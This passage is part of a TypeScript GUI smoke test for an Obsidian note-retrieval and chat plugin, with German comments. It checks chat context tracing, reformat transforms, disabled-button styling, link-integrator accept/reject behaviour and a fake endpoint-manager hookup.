        if (!st.indexed) return "Index NICHT geladen — daher kein Kontext (kein Befund am Chat)";
        if (st.reindexing) return "Voll-Reindex laeuft — Kontext waere unvollstaendig";
        return "Index geladen (" + st.noteCount + " Notizen) — dann haengt es am Embedding-Endpunkt";
      `).catch(() => "Diagnose fehlgeschlagen");
      const ctxPaths = (chatTrace.last as { contextPaths?: unknown } | null)?.contextPaths;
      const ctxListe = Array.isArray(ctxPaths) ? ctxPaths.map(String) : [];
      const chipsGedeckt = panelChips.length > 0
        && ctxListe.length === panelChips.length
        && panelChips.every(name => ctxListe.some(pfad => pfad.endsWith(`/${name}.md`) || pfad === `${name}.md`));
      record("Die Chat-Zeile trägt die Kontext-Pfade, die das Panel zeigt",
        chipsGedeckt,
        chipsDa
          ? `${panelChips.length} Chips · ${ctxListe.length} contextPaths${chipsGedeckt ? "" : ` — Chips: [${panelChips.join(", ")}] · Trace: [${ctxListe.join(", ")}]`}`
          : `keine Kontext-Chips in 30 s — ${ctxDiagnose}`);

      // (2) Die Endpunkt-Probe „Thinking testen“ ist mit Welle 14 entfallen (Sampling-Profile:
      // die Antwortpruefung und „Letzte Anfrage“ ersetzen sie) — der Punkt, der ihr feature
      // `settings-probe` pruefte, hatte damit keinen Gegenstand mehr und ist gestrichen, nicht
      // als „uebersprungen“ stehen geblieben (ein Skip ohne Gegenstand meldet nichts gemessen).

      // (3) Reformat: das feature traegt die Transform-ID. Ohne sie stehen alle Umformatierungen
      // als ein Topf in der Aufzeichnung, und "welcher Transform frisst mein Budget" ist nicht
      // beantwortbar. Ueber den echten Panel-Knopf, damit die Registry-Verdrahtung mitgeprueft ist.
      const rfBefore = await main.evaluate<number>(`return window.__vaultRagLabSeen.length;`);
      const rfStarted = await main.evaluate<boolean>(`
        const file = app.vault.getMarkdownFiles().find(f => f.stat.size > 400 && f.stat.size < 20000);
        if (!file) return false;
        const leaf = app.workspace.getLeaf(false);
        await leaf.openFile(file, { state: { mode: "source" } });
        await new Promise(r => setTimeout(r, 600));
        // KEIN require("obsidian") — im CDP-Renderer-Kontext existiert der Modul-Loader nicht
        // (Cannot find module 'obsidian'), und getActiveViewOfType braucht die Klasse. Der
        // Workspace haelt den Editor ohnehin direkt.
        const ed = app.workspace.activeEditor?.editor;
        if (!ed) return false;
        // Eine Auswahl herstellen, die der Nutzer auch treffen wuerde: die erste nichtleere Zeile.
        let line = 0;
        while (line < ed.lineCount() && ed.getLine(line).trim().length < 20) line++;
        if (line >= ed.lineCount()) return false;
        ed.setSelection({ line, ch: 0 }, { line, ch: ed.getLine(line).length });
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.captureSelection();
        await app.commands.executeCommandById("vault-retrieval:open-reformat");
        await new Promise(r => setTimeout(r, 800));
        // Gezielt die ZWEITE Gruppe (LLM mit Vorschau). Nicht "der letzte Knopf": das ist der
        // Freitext-Knopf, und der tut ohne Anweisung im Textfeld bewusst nichts (er kehrt bei
        // leerer Anweisung sofort zurueck) — der Pruefpunkt lief damit ins Leere und meldete
        // "Transform lief nicht", was wie ein Verdrahtungsfehler aussah. KEINE Backticks in
        // diesem Kommentar: der ganze Block ist selbst ein Template-String, ein Backtick
        // beendet ihn mitten im Code. Und nicht "der erste": die erste
        // Gruppe ist mechanisch, die ersetzt sofort ohne Modell und ohne Lab-Zeile.
        const nodes = [...document.querySelectorAll(".vault-rag-reformat-group-title, .vault-rag-reformat-btn")];
        let titles = 0;
        const llm = [];
        for (const n of nodes) {
          if (n.classList.contains("vault-rag-reformat-group-title")) { titles++; continue; }
          if (titles === 2 && !n.closest(".vault-rag-reformat-freetext")) llm.push(n);
        }
        window.__vaultRagRfButtons = llm.length;
        // Die Panel-Knoepfe sperrt das disabled-ATTRIBUT, nicht die Klasse is-disabled: die Klassen-
        // pruefung liess gesperrte Knoepfe durch, der Klick lief dann still ins Leere (Welle 14).
        const usable = llm.filter(b => !b.disabled);
        if (!usable.length) return false;
        usable[0].click();
        return true;
      `);
      if (!rfStarted) {
        unmeasured("Reformat meldet sich mit der Transform-ID im feature", "keine geeignete Notiz/Auswahl herstellbar");
      } else {
        await pollUntil(main, `return window.__vaultRagLabSeen.length > ${rfBefore};`, 180_000, 1_000).catch(() => false);
        const rfTrace = await main.evaluate<{ features: string[] }>(`
          return { features: window.__vaultRagLabSeen.slice(${rfBefore}).map(x => x.feature) };
        `);
        const rf = rfTrace.features[rfTrace.features.length - 1] ?? "";
        record("Reformat meldet sich mit der Transform-ID im feature",
          /^reformat:.+/.test(rf), rf ? `feature=${rf}` : "keine Zeile — Transform lief nicht");
        // Modal schliessen, ohne anzuwenden: der Smoke veraendert keine Notiz.
        //
        // `.modal-container` ist Obsidians GETEILTE Region — jedes Plugin haengt seine Modals
        // dort ein. Ungescoped nimmt `querySelectorAll` das erstbeste, also moeglicherweise den
        // Abbrechen-Knopf eines FREMDEN Dialogs, waehrend unsere Vorschau offen stehen bleibt
        // und die nachfolgenden Pruefpunkte verfaelscht. Deshalb erst unser eigenes Modal
        // suchen (`.vault-rag-reformat-preview`) und nur darin klicken; nur wenn es nicht da
        // ist, bleibt Escape als Notausgang. Dach-Befund 2026-08-30 („GUI-Smoke greift geteilte
        // Obsidian-DOM-Regionen"), fuer dieses Repo war es die einzige solche Stelle.
        //
        // Gescoped wird ueber ein KIND, nicht ueber das Modal selbst: `ReformatPreviewModal`
        // setzt keine eigene Klasse auf `modalEl` (gemessen an `src/reformat_preview_modal.ts` —
        // dort tragen nur `.vault-rag-reformat-{label,notice,original,result}` eine). Ein Scope
        // auf eine erfundene Modal-Klasse haette immer leer getroffen und waere still auf den
        // Escape-Zweig gefallen: derselbe Ausgang wie vorher, nur unsichtbar.
        await main.evaluate(`
          const marker = document.querySelector(".vault-rag-reformat-original, .vault-rag-reformat-result");
          const eigenes = marker && (marker.closest(".modal") || marker.closest(".modal-container"));
          const btns = eigenes ? [...eigenes.querySelectorAll("button")] : [];
          const discard = btns.find(b => /verwerf|discard|abbrech|cancel/i.test(b.textContent || ""));
          if (discard) discard.click();
          else document.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
          return { eigenes: !!eigenes, discard: !!discard };
        `).catch(() => ({ eigenes: false, discard: false }));
        // Der Aufraeumschritt ist seit 679a9f5 auf das eigene Modal gescoped — ob er trifft, ist
        // aber nur am ERGEBNIS zu sehen: die Vorschau muss danach aus dem DOM sein. Ohne diesen
        // Punkt waere der Fix strukturell belegt („der Aufruf steht jetzt richtig"), nie
        // inhaltlich (LESSONS 2026-09-03, yijing-oracle: den reparierten Pfad einmal betreten).
        const previewGone = await pollUntil(main,
          `return !document.querySelector(".vault-rag-reformat-original, .vault-rag-reformat-result");`,
          5_000, 250).catch(() => false);
        record("Die Reformat-Vorschau ist nach dem Verwerfen geschlossen",
          previewGone === true,
          previewGone ? "kein .vault-rag-reformat-original/-result mehr im DOM" : "Vorschau steht noch — Verwerfen-Knopf nicht im eigenen Modal getroffen?");
      }

      // (4) Lab weg → der Chat laeuft VOLLSTAENDIG durch und meldet nichts. Die Reihenfolge ist
      // bedeutungstragend: erst das Ende des Streams belegen, dann die Abwesenheit pruefen.
      // Andersherum ist der Punkt trivial gruen, weil der Aufruf noch laeuft — genau so war er
      // beim ersten Anlauf falsch gruen (_docs/LESSONS.md, "Ein Pruefpunkt, der Abwesenheit misst").
      await main.evaluate(`
        delete app.plugins.plugins["llm-lab"];
        window.__vaultRagLabBaseline = window.__vaultRagLabSeen.length;
        await app.commands.executeCommandById("vault-retrieval:open-vault-chat");
        await new Promise(r => setTimeout(r, 800));
        document.querySelector(".vault-rag-chat-new").click();
        await new Promise(r => setTimeout(r, 400));
        const ta = document.querySelector(".vault-rag-chat-input");
        ta.value = "Antworte mit genau einem Wort: Tschuess.";
        ta.dispatchEvent(new Event("input", { bubbles: true }));
        document.querySelector(".vault-rag-chat-send").click();
      `);
      const offDone = await pollUntil(main,
        `const w = document.querySelector(".vault-rag-chat-working"); return !!w && /✓/.test(w.textContent || "");`,
        CHAT_FRIST_MS, 1_000).catch(() => false);
      const offTrace = await main.evaluate<{ added: number }>(`
        return { added: window.__vaultRagLabSeen.length - window.__vaultRagLabBaseline };
      `);
      record("Ohne Lab läuft der Chat vollständig durch und meldet nichts",
        offDone === true && offTrace.added === 0,
        offDone ? `Antwort kam, ${offTrace.added} neue Zeilen` : "Antwort blieb aus — Abwesenheit der Zeile beweist hier NICHTS");
    }

    // --- 7d. Smart Apply: der gesperrte Anwenden-Knopf LIEST sich als gesperrt --------------
    // Gegenprobe-Task vom 2026-08-23, gemessen 2026-09-11: die Klasse `is-disabled` stand am Knopf
    // (ein Unit-Test pinnt sie), aber Obsidians Theme rendert sie auf <button> nicht — opacity 1,
    // cursor default, derselbe Hintergrund wie aktiv. Ein Screenshot zeigte gesperrt und aktiv
    // identisch. Deshalb misst dieser Punkt den COMPUTED STYLE, nicht die Klasse: eine Klasse ohne
    // Regel ist eine Zusage ohne Wirkung. Hergestellt wird der Zustand ueber einen Vorlagen-Ordner,
    // den es nicht gibt (Rangliste leer → keine Vorlage gewaehlt → canRun false).
    {
      const saPre = await main.evaluate<{ enabled: boolean; templateDir: string }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        return { enabled: !!p.settings.smartApplyEnabled, templateDir: p.settings.templateDir };
      `);
      if (!saPre.enabled) {
        unmeasured("Gesperrter Anwenden-Knopf ist sichtbar gesperrt (nicht nur per Klasse)", "smartApplyEnabled ist aus — Fixture-Einstellungen nicht geladen?");
      } else {
        templateDirRestore = saPre.templateDir;
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.templateDir = "Nix/"; await p.saveSettings(); p.refreshSmartApplyRanking();
          await app.workspace.openLinkText("Notes/Integrator plain.md", "", false);
          await app.commands.executeCommandById("vault-retrieval:smart-apply-active-note");
        `);
        const sa = await pollUntil<{ opacity: string; cursor: string; pe: string; aria: string | null }>(main, `
          const btn = document.querySelector(".vault-rag-sa-run.is-disabled");
          if (!btn) return null;
          const cs = getComputedStyle(btn);
          return { opacity: cs.opacity, cursor: cs.cursor, pe: cs.pointerEvents, aria: btn.getAttribute("aria-disabled") };
        `, 15000, 500);
        // Form UND Cursor, nicht Farbe: opacity < 1 ist die sichtbare Haelfte, pointer-events none die
        // bedienbare, aria-disabled die fuer Screenreader. Alle drei muessen stehen.
        record("Gesperrter Anwenden-Knopf ist sichtbar gesperrt (nicht nur per Klasse)",
          sa !== null && Number(sa.opacity) < 1 && sa.pe === "none" && sa.aria === "true",
          sa ? `opacity ${sa.opacity} · cursor ${sa.cursor} · pointer-events ${sa.pe} · aria-disabled ${sa.aria}` : "kein .vault-rag-sa-run.is-disabled im DOM");
        await main.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.templateDir = ${JSON.stringify(saPre.templateDir)}; await p.saveSettings(); p.refreshSmartApplyRanking();
        `);
        templateDirRestore = null;
      }
    }

    // --- 7c. Integrator: Vorschlag → Annehmen → Idempotenz → Ablehnen → Frontmatter ---
    // Spec 2026-09-07 §10. Misst die VERDRAHTUNG (main.ts) am laufenden Plugin: dass ein
    // Vorschlag entsteht, dass Annehmen wirklich in die Datei schreibt, dass ein zweites Anwenden
    // die Datei byte-identisch laesst, dass eine Ablehnung beim Neuberechnen haelt, und dass der
    // Frontmatter-Modus nur die `related:`-Zeilen anfasst. Die reinen Haelften sind unit-getestet;
    // ob `acceptLink` den richtigen Schreiber waehlt und der Store gespeichert wird, sieht nur
    // dieser Abschnitt. Der Integrator ist im Fixture eingeschaltet (`integratorEnabled`).
    {
      const PLAIN = "Notes/Integrator plain.md";
      const REL = "Notes/Integrator related.md";
      // Die Tab-Zahl ist KEINE Konstante: Smart Apply ist im Fixture aus, also stehen fuenf Tabs in
      // der Leiste, mit Smart Apply sechs. Gemessen wird deshalb die Tab-LISTE gegen die Panel-Liste
      // des Hubs — Lauf 1 am 2026-09-07 war an einer hart verdrahteten Sechs rot, ohne Befund.
      // Ausgangslage aus dem getrackten Fixture herstellen, nicht aus dem, was der Vault gerade
      // traegt: ein abgebrochener Lauf laesst die Notizen veraendert zurueck, und die Sicherung
      // unten wuerde diesen Stand als „Original" festschreiben (Welle 14: `related:` trug schon
      // einen Eintrag, der Frontmatter-Punkt blieb dauerhaft rot).
      const fixtureNote = (name: string) =>
        readFileSync(join(cwd(), "docs", "images", "fixture", "notes", name), "utf8");
      await main.evaluate(`
        await app.vault.adapter.write(${JSON.stringify(PLAIN)}, ${JSON.stringify(fixtureNote(PLAIN))});
        await app.vault.adapter.write(${JSON.stringify(REL)}, ${JSON.stringify(fixtureNote(REL))});
      `);
      const intPre = await main.evaluate<{ enabled: boolean; tabs: string[]; panels: string[]; plain: string; rel: string }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const leaf = app.workspace.getLeavesOfType("vault-retrieval-hub")[0];
        return {
          enabled: !!p.settings.integratorEnabled,
          tabs: [...document.querySelectorAll(".okit-hub-tab")].map(t => t.textContent.trim()),
          panels: leaf ? (leaf.view.panels || []).map(x => x.id) : [],
          plain: await app.vault.adapter.read(${JSON.stringify(PLAIN)}),
          rel: await app.vault.adapter.read(${JSON.stringify(REL)}),
        };
      `);
      if (!intPre.enabled) {
        for (const n of INTEGRATOR_PRUEFPUNKTE) unmeasured(n, "integratorEnabled ist aus — Fixture-Einstellungen nicht geladen?");
      } else {
        integratorRestore = { plain: intPre.plain, rel: intPre.rel };
        record("Tab „Integrator“ steht in der Leiste, vor „Umformatieren“",
          intPre.panels.includes("integrator") && intPre.tabs.length === intPre.panels.length
            && intPre.panels.indexOf("integrator") === intPre.panels.indexOf("reformat") - 1,
          `${intPre.tabs.length} Tabs: ${intPre.tabs.join(" · ")}`);

        const proposed = await main.evaluate<{ kind: string; n: number; target: string | null }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const r = await p.proposeFor(${JSON.stringify(PLAIN)});
          const links = r.kind === "proposal" ? r.proposal.links : [];
          return { kind: r.kind, n: links.length, target: links[0]?.path ?? null };
        `);
        record("Kommando-Pfad erzeugt einen Vorschlag für die Fixture-Notiz",
          proposed.kind === "proposal" && proposed.n > 0, `${proposed.kind} · ${proposed.n} Ziele · erstes: ${proposed.target ?? "—"}`);

        if (proposed.target) {
          const target = proposed.target;
          const expectLink = `[[${target.replace(/\.md$/, "")}|${(target.split("/").pop() ?? target).replace(/\.md$/, "")}]]`;
          // Annehmen ueber den Knopf im Panel — der Weg, den der Nutzer geht. Der Tab wird per
          // Kommando geoeffnet; der erste Accept-Knopf gehoert zur Karte der aktiven Notiz, also
          // erst PLAIN oeffnen, damit die Sortierung sie nach oben stellt.
          await main.evaluate(`
            await app.workspace.openLinkText(${JSON.stringify(PLAIN)}, "", false);
            await app.commands.executeCommandById("vault-retrieval:open-integrator");
          `);
          await pollUntil<number>(main, `const n = document.querySelectorAll(".vault-rag-int-accept").length; return n > 0 ? n : null;`, 5000, 250);
          const acceptedFirst = await main.evaluate<{ title: string | null }>(`
            const card = document.querySelector(".vault-rag-int-card");
            const btn = card ? card.querySelector(".vault-rag-int-accept") : null;
            const title = card ? card.querySelector(".vault-rag-int-card-title") : null;
            if (btn) btn.click();
            return { title: title ? title.textContent : null };
          `);
          const after1 = await pollUntil<string>(main, `
            const t = await app.vault.adapter.read(${JSON.stringify(PLAIN)});
            return t !== ${JSON.stringify(intPre.plain)} ? t : null;
          `, 5000, 250);
          const wroteSection = typeof after1 === "string" && after1.startsWith(intPre.plain.replace(/\n+$/, ""))
            && after1.includes("## Verwandte Notizen") && after1.includes(expectLink);
          record("Annehmen im Panel schreibt den Abschnitt mit dem Wikilink in die Datei",
            wroteSection && acceptedFirst.title === "Integrator plain",
            `Karte „${acceptedFirst.title ?? "—"}“ · +${(after1?.length ?? 0) - intPre.plain.length} Bytes · ${expectLink}`);

          const again = await main.evaluate<{ ok: boolean; changed?: boolean; reason?: string; text: string }>(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            const r = await p.applyLinkNow(${JSON.stringify(PLAIN)}, ${JSON.stringify(target)});
            return { ...r, text: await app.vault.adapter.read(${JSON.stringify(PLAIN)}) };
          `);
          record("Zweites Anwenden desselben Ziels lässt die Datei byte-identisch",
            again.ok && again.changed === false && again.text === after1,
            `changed=${String(again.changed)} · ${again.text === after1 ? "Bytes gleich" : "Bytes VERSCHIEDEN"}`);
        } else {
          record("Annehmen im Panel schreibt den Abschnitt mit dem Wikilink in die Datei", false, "kein Ziel vorgeschlagen");
          record("Zweites Anwenden desselben Ziels lässt die Datei byte-identisch", false, "kein Ziel vorgeschlagen");
        }

        // Ablehnen: das erste verbleibende Ziel ablehnen, neu berechnen, es darf nicht wiederkommen.
        const rejected = await main.evaluate<{ before: number; after: number; has: boolean; tgt: string | null }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const cur = p.integratorStore.get(${JSON.stringify(PLAIN)});
          if (!cur || cur.links.length === 0) return { before: 0, after: 0, has: false, tgt: null };
          const tgt = cur.links[0].path;
          p.integratorStore.resolve(${JSON.stringify(PLAIN)}, tgt, "rejected");
          const r = await p.proposeFor(${JSON.stringify(PLAIN)});
          const links = r.kind === "proposal" ? r.proposal.links.map(l => l.path) : [];
          return { before: cur.links.length, after: links.length, has: links.includes(tgt), tgt };
        `);
        if (rejected.before === 0) unmeasured("Abgelehntes Ziel kommt beim Neuberechnen nicht wieder", "nach dem Annehmen blieb kein weiteres Ziel zum Ablehnen");
        else record("Abgelehntes Ziel kommt beim Neuberechnen nicht wieder", !rejected.has, `${rejected.tgt} · vorher ${rejected.before}, nachher ${rejected.after} Ziele`);

        // Zweiter Klick auf derselben Karte: die Naht acceptLink → updateHash. Ohne sie wäre jeder zweite Klick „veraltet",
        // und „Alle annehmen" lieferte N−1 falsche Warnungen. Gemessen am Panel (Knopf), nicht an applyLinkNow.
        // Der automatische Auslöser (integratorFolders) rechnet nach jedem Schreiben neu und würde den Hash selbst frisch
        // setzen — die Naht bliebe unsichtbar (Mutationsprobe 2026-10-14: updateHash entfernt, Punkt blieb grün). Darum
        // für diesen Abschnitt aus; der Wert steht danach wieder da.
        const foldersGesichert = await main.evaluate<string[]>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const f = [...p.settings.integratorFolders]; p.settings.integratorFolders = []; return f;
        `);
        const zweiter = await main.evaluate<{ links: number }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          // Frisch aus dem Fixture: sonst sind Ziele der Karte schon im Text (die Karte rechnet mit dem Link-Stand des
          // Metadaten-Caches), der Klick schreibt nichts, und der zweite Klick prüft den Hash nicht gegen einen neuen Text.
          await app.vault.adapter.write(${JSON.stringify(PLAIN)}, ${JSON.stringify(fixtureNote(PLAIN))});
          await new Promise(r => setTimeout(r, 1200));
          await app.workspace.openLinkText(${JSON.stringify(PLAIN)}, "", false);
          await p.proposeFor(${JSON.stringify(PLAIN)});
          await app.commands.executeCommandById("vault-retrieval:open-integrator");
          const cur = p.integratorStore.get(${JSON.stringify(PLAIN)});
          return { links: cur ? cur.links.length : 0 };
        `);
        if (zweiter.links < 2) {
          unmeasured(INTEGRATOR_PRUEFPUNKTE[6]!, `nach Annehmen und Ablehnen blieben ${zweiter.links} Ziele (nötig: 2, zwei Klicks)`);
        } else {
          await pollUntil<number>(main, `const n = document.querySelectorAll(".vault-rag-int-accept").length; return n > 0 ? n : null;`, 5000, 250);
          // ZWEI Klicks hintereinander ohne Neuberechnung dazwischen: der zweite sieht den Text, den der erste geschrieben hat.
          const klick = await main.evaluate<{ before: number; len0: number }>(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            const before = p.integratorStore.get(${JSON.stringify(PLAIN)}).links.length;
            const len0 = (await app.vault.adapter.read(${JSON.stringify(PLAIN)})).length;
            document.querySelector(".vault-rag-int-card .vault-rag-int-accept").click();
            return { before, len0 };
          `);
          const erst = await pollUntil<number>(main, `
            const cur = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].integratorStore.get(${JSON.stringify(PLAIN)});
            return cur && cur.links.length < ${klick.before} ? cur.links.length + 1 : null;
          `, 5000, 250);
          const len1 = await main.evaluate<number>(`return (await app.vault.adapter.read(${JSON.stringify(PLAIN)})).length;`);
          await main.evaluate(`document.querySelector(".vault-rag-int-card .vault-rag-int-accept").click();`);
          const nach = await pollUntil<{ links: number; stale: boolean; staleEl: boolean }>(main, `
            const cur = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].integratorStore.get(${JSON.stringify(PLAIN)});
            return cur && cur.links.length < ${klick.before - 1} ? { links: cur.links.length, stale: cur.stale, staleEl: !!document.querySelector(".vault-rag-int-stale") } : null;
          `, 5000, 250);
          record(INTEGRATOR_PRUEFPUNKTE[6]!, erst !== null && !!nach && !nach.stale && !nach.staleEl,
            nach ? `Text ${klick.len0} → ${len1} Zeichen (nach Klick 1) · Ziele ${klick.before} → ${klick.before - 1} → ${nach.links} · stale=${String(nach.stale)} · Stale-Hinweis ${nach.staleEl ? "DA" : "fehlt (richtig)"}` : "der zweite Klick änderte nichts (veraltet?)");

          // Hotkey-Commands über die Palette (executeCommandById): erst ablehnen, dann annehmen — beide an der aktiven Notiz.
          const hk = await main.evaluate<Record<string, unknown>>(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            await app.workspace.openLinkText(${JSON.stringify(PLAIN)}, "", false);
            // frischer Stand (der Text hat sich durch die Klicks geändert) mit weitem Netz, damit zwei Ziele da sind
            const keep = { k: p.settings.linkK, m: p.settings.linkMinSim };
            p.settings.linkK = 20; p.settings.linkMinSim = 0;
            try { await p.proposeFor(${JSON.stringify(PLAIN)}); } finally { p.settings.linkK = keep.k; p.settings.linkMinSim = keep.m; }
            const c0 = p.integratorStore.get(${JSON.stringify(PLAIN)});
            if (!c0 || c0.links.length < 2) return { first: null, second: null, rejectedOk: false, written: false, zuWenig: c0 ? c0.links.length : 0 };
            const first = c0.links[0].path;
            await app.commands.executeCommandById("vault-retrieval:integrator-reject-next");
            const c1 = p.integratorStore.get(${JSON.stringify(PLAIN)});
            const rejectedOk = p.integratorStore.rejectedFor(${JSON.stringify(PLAIN)}).has(first) && (!c1 || !c1.links.some(l => l.path === first));
            const second = c1 ? c1.links[0].path : null;
            const textBefore = await app.vault.adapter.read(${JSON.stringify(PLAIN)});
            await app.commands.executeCommandById("vault-retrieval:integrator-accept-next");
            await new Promise(r => setTimeout(r, 800));
            const textAfter = await app.vault.adapter.read(${JSON.stringify(PLAIN)});
            const base = second ? second.replace(/\.md$/, "") : "";
            return { first, second, rejectedOk, written: !!second && textAfter !== textBefore && textAfter.includes("[[" + base) };
          `);
          if (hk.zuWenig !== undefined) unmeasured(INTEGRATOR_PRUEFPUNKTE[7]!, `nach dem Neuberechnen ${String(hk.zuWenig)} Ziele (nötig: 2, Ablehnen und Annehmen)`);
          else record(INTEGRATOR_PRUEFPUNKTE[7]!, hk.rejectedOk === true && hk.written === true,
            `abgelehnt ${String(hk.first)}: ${String(hk.rejectedOk)} · angenommen ${String(hk.second)}: ${String(hk.written)}`);
        }

        await main.evaluate(`app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.integratorFolders = ${JSON.stringify(foldersGesichert)};`);

        // Frontmatter-Modus an der Notiz mit `related: []` — nur diese Zeilen duerfen sich aendern.
        const fm = await main.evaluate<{ ok: boolean; detail: string; text: string }>(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          const saved = p.settings.linkTarget;
          p.settings.linkTarget = "frontmatter"; await p.saveSettings();
          try {
            const r = await p.proposeFor(${JSON.stringify(REL)});
            if (r.kind !== "proposal") return { ok: false, detail: "proposeFor: " + r.kind, text: "" };
            const a = await p.acceptLink(${JSON.stringify(REL)}, r.proposal.links[0].path);
            return { ok: a.kind === "written", detail: "acceptLink: " + a.kind + (a.reason ? " " + a.reason : ""), text: await app.vault.adapter.read(${JSON.stringify(REL)}) };
          } finally { p.settings.linkTarget = saved; await p.saveSettings(); }
        `);
        const fmHead = fm.text.split("\n").slice(0, 6);
        const fmOk = fm.ok
          && fmHead[0] === "---" && fmHead[1] === "title: Integrator related" && fmHead[2] === "related:"
          && /^  - "\[\[[^\]]+\]\]"$/.test(fmHead[3] ?? "") && fmHead[4] === "tags: [fixture]" && fmHead[5] === "---"
          && fm.text.slice(fm.text.indexOf("\n---\n") + 5) === intPre.rel.slice(intPre.rel.indexOf("\n---\n") + 5);
        record("Frontmatter-Modus: related: [] wird zur Blockliste, Rest byte-identisch",
          fmOk, `${fm.detail} · ${fmHead.join(" ⏎ ")}`);
      }
    }

    // --- 9. Endpunkte vom LLM Endpoint Manager (Welle 8) --------------------
    // Ein FAKE-Manager (findEndpointManager prueft nur die Form, nicht die Herkunft) traegt fuer
    // BEIDE Rollen einen Endpunkt. `config.model` ist absichtlich gesetzt und gleich dem
    // defaultModel — der echte Manager tut das (lingotuner-Fund C1): wer `config.model` statt des
    // aufgeloesten Modells uebernimmt, ueberschreibt die Nutzerwahl. Der Embedding-Endpunkt traegt
    // ein FREMDES Modell: das ist der Rand aus der Task „Kein Endpunkt als aktiv markiert, wenn
    // keiner zum Index-Modell passt" — der Modell-Guard muss auch fuer den Manager-Endpunkt gelten.
    // Der lokale Endpunkt der Fixture ist erreichbar; der Manager-Endpunkt zeigt bewusst auf
    // dieselbe URL, unterscheidbar bleibt er ueber Modell und Schluessel (nie ueber die URL).
    const mgrPre = await main.evaluate<{ ok: boolean; reason?: string }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      if (!p.settings.chatEndpoints[0]?.url || !p.settings.embeddingEndpoints[0]?.url) return { ok: false, reason: "keine lokalen Endpunkte in der Fixture" };
      if (app.plugins.plugins[${JSON.stringify(MGR)}]) return { ok: false, reason: "ein echter Endpoint Manager ist installiert — der Smoke haengt keinen Fake daneben" };
      return { ok: true };
    `);
    if (!mgrPre.ok) {
      for (const n of MGR_PUNKTE) unmeasured(n, mgrPre.reason ?? "Voraussetzung fehlt");
    } else {
      const mgrLocal = await main.evaluate<{ chatUrl: string; embUrl: string; chatModel: string }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        return { chatUrl: p.settings.chatEndpoints[0].url, embUrl: p.settings.embeddingEndpoints[0].url, chatModel: p.settings.chatEndpoints[0].model || "" };
      `);
      try {
        // Fake-Manager aus der zentralen Brücke: beide Rollen, `config.model` = Standardmodell (wie der echte Manager,
        // lingotuner-Fund C1), der Schlüssel kommt in `resolve().config.apiKey` zurück; `caller` im Aufrufmitschnitt.
        // Gegenprobe VOR dem Einbau: ohne Manager darf die Zeile des Bausteins nicht stehen, die lokalen Zeilen schon.
        const ohneMgr = await liesManagerSicht(main, port, vault);
        const fakeOpts = {
          pluginId: MGR,
          endpunkte: [
            { id: "w8-chat", label: "w8-chat", url: mgrLocal.chatUrl, models: [MGR_MODEL], defaultModel: MGR_MODEL, capabilities: ["chat" as const], apiKey: "w8-schluessel", configModel: "default" as const },
            { id: "w8-embedding", label: "w8-embedding", url: mgrLocal.embUrl, models: [MGR_EMB_MODEL], defaultModel: MGR_EMB_MODEL, capabilities: ["embedding" as const], apiKey: "w8-schluessel", configModel: "default" as const },
          ],
        };
        // Offenes Einstellungs-Fenster: Manager einhängen, das Fenster bleibt offen, nur der Tab wechselt weg und zurück.
        // Regressionswächter, KEIN Beleg für `installTabRefreshOnOpen`: Mutationsprobe 2026-10-14 (Hook ausgebaut) blieb
        // grün, Obsidian 1.14.4 zeichnet den Tab beim Zurückwechseln auch ohne den Hook neu (die Messung von yijing-oracle
        // stammt von 1.14.2). Einen Event gibt es dafuer nicht: ohne Manager beim Start ist das `changed`-Abo ein No-op
        // (Kit `onEndpointManagerChanged`). Danach wieder entfernen.
        // Gegenprobe im selben Zug: vor dem Einhängen steht keine Bausteinzeile, nach dem Entfernen wieder die lokalen Zeilen.
        const lesen = `return { baustein: [...document.querySelectorAll(".setting-item-name")].some((e) => /come from the LLM Endpoint Manager|kommen vom LLM Endpoint Manager/.test(e.textContent ?? "")), rows: document.querySelectorAll(".okit-ep-row").length };`;
        await main.evaluate(`app.setting.close();`);
        await openSettings(main);
        const offen = await attachTo("settings", port, vault);
        if (!offen) unmeasured(MGR_PUNKTE[6]!, "Einstellungs-Fenster nicht erreichbar");
        else {
          try {
            const vorher = await offen.evaluate<{ baustein: boolean; rows: number }>(lesen);
            const wechsel = `app.setting.openTabById("appearance"); await new Promise(r => setTimeout(r, 400)); app.setting.openTabById(${JSON.stringify(PLUGIN_ID)}); await new Promise(r => setTimeout(r, 600));`;
            await installFakeManager(main, fakeOpts);
            await main.evaluate(wechsel);
            const erscheint = await pollUntil(offen, `const m = (() => { ${lesen} })(); return m.baustein ? true : null;`, 5000, 250);
            await entferneFakeManager(main, { pluginId: MGR });
            await main.evaluate(wechsel);
            const weg = await pollUntil(offen, `const m = (() => { ${lesen} })(); return !m.baustein && m.rows > 0 ? true : null;`, 5000, 250);
            record(MGR_PUNKTE[6]!, !vorher.baustein && vorher.rows > 0 && !!erscheint && !!weg,
              `vorher: Baustein ${vorher.baustein ? "DA" : "fehlt"} · ${vorher.rows} Zeilen; nach Einhängen: Baustein ${erscheint ? "erscheint" : "ERSCHEINT NICHT"}; nach Entfernen: lokale Zeilen ${weg ? "wieder da" : "FEHLEN"}`);
          } finally {
            offen.close();
            await main.evaluate(`app.setting.close();`);
          }
        }
        await installFakeManager(main, fakeOpts);
        const m1 = await main.evaluate<Record<string, unknown>>(`
